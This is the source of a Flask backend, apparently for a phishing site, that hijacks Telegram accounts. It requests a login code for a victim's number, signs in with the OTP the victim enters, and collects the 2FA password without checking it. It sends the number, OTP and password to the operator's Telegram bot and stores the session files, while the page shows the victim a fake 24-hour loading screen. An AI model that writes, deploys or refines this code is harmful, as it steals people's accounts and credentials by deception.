import os
import asyncio
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Mengizinkan akses dari domain manapun secara global
CORS(app, resources={r"/*": {"origins": "*"}})

# Variabel dari dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

def send_to_bot(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except:
        pass

async def telethon_logic(data):
    """Logika Telethon: Deteksi OTP & Langsung Loloskan 2FA ke Loading"""
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'User')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # STEP 1: Kirim OTP
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            send_to_bot(f"📲 *Mencoba Daftar*\nNama: {nama}\nNomor: {nomor}")
            return {"status": "success"}, 200

        # STEP 2: Verifikasi OTP & Deteksi 2FA
        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                # Jika akun punya sandi, arahkan ke halaman input sandi
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "error", "message": "Kode OTP Salah!"}, 400

        # STEP 3: Terima Sandi (Abaikan Validasi agar langsung ke Loading)
        elif step == 3:
            send_to_bot(f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}")
            # Beri respon sukses agar website beralih ke halaman loading 24 jam
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

# FUNGSI FIX CORS MANUAL: Memaksa header izin agar tidak merah di konsol
def _corsify(response):
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add("Access-Control-Allow-Headers", "*")
    response.headers.add("Access-Control-Allow-Methods", "*")
    return response

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    # Menangani pengecekan (preflight) browser agar tombol bisa diklik
    if request.method == 'OPTIONS':
        return _corsify(make_response())
        
    data = request.json
    try:
        result, status_code = async_to_sync(telethon_logic)(data)
        return _corsify(make_response(jsonify(result), status_code))
    except Exception as e:
        return _corsify(make_response(jsonify({"status": "error", "message": str(e)}), 500))

if __name__ == "__main__":
    # Port 8080 sesuai dengan log Railway kamu
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)